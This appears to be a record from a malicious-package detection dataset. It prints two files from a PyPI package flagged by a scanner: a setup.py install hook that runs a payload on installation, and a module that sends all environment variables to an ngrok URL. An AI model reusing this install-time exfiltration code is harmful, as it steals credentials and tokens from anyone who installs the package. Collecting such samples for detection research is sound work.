[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import setuptools\nfrom setuptools.command.install import install\nfrom artifact_lab_leak import run_payload  # Import the payload function\n\n# Custom install class to run the payload when the package is installed\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)  # Run the standard installation\n        run_payload()      # Execute the payload right after installation"
  },
  {
    "pyfile": "artifact_lab_leak.py",
    "malicious_code_snippets": "import os\nimport urllib.request\nimport urllib.parse\n\ndef run_payload():\n    data = dict(os.environ)\n    encoded_data = urllib.parse.urlencode(data).encode('utf-8')\n    url = 'https://bb5be4c750d6.ngrok.app/collect'\n    req = urllib.request.Request(url, data=encoded_data)\n    req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n    try:\n        urllib.request.urlopen(req)\n    except Exception as e:\n        pass"
  },
  {
    "metadata": {
      "package_name": "artifact-lab-3-package-4c04b1a2-1.0.5",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/artifact-lab-3-package-4c04b1a2-1.0.5.txt"
    }
  }
]